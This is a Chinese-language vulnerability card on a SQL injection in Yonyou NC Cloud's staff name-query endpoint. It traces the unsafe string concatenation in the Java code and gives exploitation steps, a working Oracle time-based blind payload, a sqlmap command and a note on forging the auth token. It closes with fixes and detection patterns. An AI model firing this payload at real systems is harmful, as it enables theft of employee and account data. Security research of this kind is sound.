---
id: web-java-component-yonyou-nccloud-staff-querystaffbyname-sqli
title: 用友 NC Cloud /ncchr/pm/staff/queryStaffByName SQL 注入：name 拼接 like 查询，Oracle 时间盲注实测打通
type: scenario
domain: web
path: web/java/component
technique: yonyou-nccloud-querystaffbyname-concat-sqli
aliases:
- 用友 NC Cloud SQL 注入
- queryStaffByName 注入
- querySimpleStaffPageByName
- bd_psndoc.name like 注入
- NC Cloud Oracle 盲注
- ncchr pm staff sqli
tags:
- java
- yonyou
- nccloud
- ncchr
- sqli
- oracle
- time-blind
- string-concat
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-12'
updated: '2026-11-12'
verification:
  verified_by: verifier-V626
  verified_at: '2026-11-12T23:26:19+08:00'
  notes: 已通读原文并逐张核对22张图：queryStaffByName控制器、StaffHelper、querySimpleStaffPageByName的bd_psndoc.name like '%name.trim()%'拼接、queryCommonSimpleStaffPage/List与IPsndocQryService.queryPsndocVOByCondition均与卡一致；Burp请求name含dbms_pipe.receive_message(chr(...))、accessTokenNcc头、响应200与5154ms，sqlmap报Oracle并给出boolean/error/time-based三类payload，与卡一致。已把一句话结论中PsndocQryService更正为IPsndocQryService。dedup：与U8Cloud multi-service、NC65 doApply、Cynthia/Xiahuia/Docsys等不同产品/接口，非同链；dup-scan无涉及pair。affected_versions原文未给未设置。未验证点：未本机复现；数据库账号DBMS_PIPE权限原文未说明，卡已列为触发条件。
---

## 一句话结论

用友 NC Cloud 的 `GET /ncchr/pm/staff/queryStaffByName?name=` 把 `name` 直接拼接进 `bd_psndoc.name like '%<name>%'` 条件，一路传到 `IPsndocQryService.queryPsndocVOByCondition` 执行，无任何过滤或参数化；原文用 Oracle `DBMS_PIPE.RECEIVE_MESSAGE` 时间盲注实测延迟约 5 秒，sqlmap 同时跑通布尔/报错/时间三类注入。

## 原理

- **入口**：`/ncchr/pm/staff` 控制器中 `@RequestMapping(value={"/queryStaffByName"}, method=GET)` 的 `queryStaffByName(String name)`，在 `name` 非空时调用 `StaffHelper.queryStaffByName(name, 0, 10)`。
- **拼接链**：
  1. `StaffHelper.queryStaffByName` → `simpleService.querySimpleStaffPageByName(name, pageObj)`；
  2. `querySimpleStaffPageByName` 中：
     ```java
     String condition = SIMPLESTAFF_ONDUTY_CON;
     if (StringUtils.isNotBlank(name)) {
         condition = condition + " and bd_psndoc.name like '%" + name.trim() + "%'";
     }
     return queryCommonSimpleStaffPage(condition, pageable);
     ```
  3. `queryCommonSimpleStaffPage` 取分页与排序信息后调用 `queryCommonSimpleStaffList(condition, ...)`；
  4. `queryCommonSimpleStaffList` 把 `condition` 与组织范围条件拼接后交给 `IPsndocQryService.queryPsndocVOByCondition`，即直接拼进 SQL 执行。
- **为什么成立**：`name` 被单引号包裹放在 `like '%...%'` 中，攻击者输入 `'` 即可闭合字符串，随后用 `AND` 追加任意 Oracle 表达式（注释掉尾部 `%'`）；整条链没有任何预编译/绑定变量/黑名单，`trim()` 不影响注入。
- **实测**：原文请求 `GET /ncchr/pm/staff/queryStaffByName?name=<URL 编码的 DBMS_PIPE.RECEIVE_MESSAGE 延时 payload>` 返回 `HTTP/1.1 200`，响应耗时 5154ms；sqlmap 识别后端为 Oracle，并列出 boolean-based blind（`CTXSYS.DRITHSX.SN`）、error-based（`UTL_INADDR.GET_HOST_ADDRESS`）、time-based blind（`DBMS_PIPE.RECEIVE_MESSAGE`）三类 payload，证明可实际注入与提取数据。
- **前提**：该接口在 `/ncchr/*` 下受 `LoginFilter` 保护，需先通过鉴权（可用硬编码 JWT 密钥伪造 `accessTokenNcc`，见关联卡）；原文 PoC 请求即携带该头。

## 触发条件

- 目标为存在该员工查询接口的用友 NC Cloud 版本，`/ncchr/pm/staff/queryStaffByName` 可达。
- 已能通过 `ncchr` 鉴权（伪造/合法 `accessTokenNcc`）。
- 后端数据库为 Oracle（原文实测；其他库需换对应延迟/布尔语法，拼接根因相同）。
- 数据库账号具备 `DBMS_PIPE` 执行权限（时间盲注依赖；若无权限可用布尔/报错注入替代）。

## 利用步骤

1. 先通过 `ncchr` 鉴权得到 `accessTokenNcc` 头。
2. 访问 `GET /ncchr/pm/staff/queryStaffByName?name=test`，确认返回员工 JSON 数据（业务正常）。
3. 注入单引号时间盲注 payload，观察响应是否延迟约 N 秒，确认注入点。
4. 用 sqlmap 或手写脚本按 Oracle 语法逐位提取数据（`information_schema` 不适用，Oracle 用 `all_tables`/`all_columns`/`sys.user$` 等）。
5. 结合权限评估危害：可读取员工/组织/账号相关表；若数据库账户权限高，可进一步评估存储过程与 OOB 通道。

## PoC

```http
GET /ncchr/pm/staff/queryStaffByName?name=1'%20AND%209017=DBMS_PIPE.RECEIVE_MESSAGE(CHR(87)||CHR(100)||CHR(112)||CHR(100),5)--%20iHzo HTTP/1.1
Host: target
accessTokenNcc: <伪造/合法 JWT>
```

观察：正常请求毫秒级返回；上述请求延迟约 5 秒即证明注入执行。

sqlmap（按原文实测形态）：

```bash
python sqlmap.py -u "http://target/ncchr/pm/staff/queryStaffByName?name=1" \
  --headers="accessTokenNcc: <JWT>" --dbms=oracle --technique=BT --batch
```

原文实测：Burp 请求 `name` 为 URL 编码的 `dbms_pipe.receive_message(chr(...))` 组合，响应 5154ms、HTTP 200；sqlmap 报 Oracle 后端并给出三类可用 payload。

## 变体与关联

- **同链路其他方法**：`queryStaffPageByDeptName(deptName)` 直接把 `deptName` 拼进 `... where name like '%<deptName>%'`；`querySimpleStaffPageByDeptIds` 的 `filter` 参数拼进 `bd_psndoc.name like '%<filter>%'`。同一 Service 实现里的其他查询方法应一并检查，可能共享同一注入根因与可达接口。
- **前置绕过**：需先通过 [[web-java-component-yonyou-nccloud-ncchr-loginfilter-jwt-defaultsecret-bypass]]。
- **同厂商 SQL 注入**：[[web-java-component-yonyou-u8cloud-multi-service-sqli]]（U8Cloud 多接口 MSSQL 盲注）、[[web-java-component-yonyou-nc65-mtapptimeline-doapply-sqli]]（NC65 Oracle）、[[web-java-component-yonyou-ksoa-unauth-jsp-sqli-multi-endpoint]]。
- **通用手法**：like 包裹下的单引号闭合盲注参见 [[web-generic-sqli-boolean-blind-parenthesis-closure-discovery]] 等通用 SQL 注入卡。

## 检测与防御

- **修复**：`name` 参数改用绑定变量/预编译（`... like ?` 以 `%value%` 作参数），或至少严格白名单校验；`queryCommonSimpleStaffList` 对 condition 的拼接方式整体改造，禁止外部字符串进入 SQL。
- **升级**：联系厂商获取 NC Cloud 补丁，核对上述方法是否已参数化。
- **检测**：`/ncchr/pm/staff/queryStaffByName` 的 `name` 含单引号、`--`、`DBMS_PIPE`、`CHR(`、`UTL_INADDR`、`CTXSYS` 等特征；同一来源大量该接口请求且响应时间阶跃（时间盲注）；数据库审计关注异常 `DBMS_PIPE`/长事务。
- **纵深防御**：数据库账号最小权限（回收 `DBMS_PIPE` 等包执行权限）；WAF 规则仅缓解；接口层统一鉴权，避免鉴权绕过放大注入面。
